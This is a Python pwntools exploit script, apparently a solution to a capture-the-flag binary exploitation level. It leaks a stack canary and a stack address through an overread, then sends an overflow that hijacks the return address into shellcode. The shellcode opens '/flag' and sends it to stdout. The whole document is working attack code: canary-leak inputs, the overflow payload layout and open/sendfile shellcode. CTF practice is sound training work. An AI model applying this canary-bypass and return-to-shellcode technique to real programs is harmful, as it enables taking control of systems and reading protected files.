from pwn import *
context.arch='amd64'

r = process('/challenge/toddlerone_level5.0')

payload = asm(
'''

    push 2
    pop rax
    lea rdi, [rip+f]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    push 1
    pop rdi
    push rax
    pop rsi
    push 40
    pop rax
    xor rdx, rdx
    push 100
    pop r10
    syscall



    f:
    .string "/flag"

'''
)

r.sendline(b'200')
r.send(b'REPEAT\x41\x41' + b'a'*0x8f + b'c'*2)
r.recvuntil(b'aaaaaaac')
canary = u64(r.recv(8))-ord('c')
print(hex(canary))

## leak stack
r.sendline(b'200')
r.send(b'REPEAT\x41\x41' + b'a'*0xa7 + b'c')
r.recvuntil(b'aaaaaaac')
stack = u64(r.recv(6) + b'\x00\x00')
print(hex(stack))


## return to stack 
secret = 0x96735187cfae0e4d ## rbp-0x30
ret_address = stack - 512
print(hex(ret_address))
r.sendline(b'1000')
r.send(b'a'*(0xb0-0x30) + p64(secret)  + b'a'*0x10 + p64(canary) + b'a' * 0x18 + p64(ret_address) + payload + b'\x00' * 0x10)

r.interactive()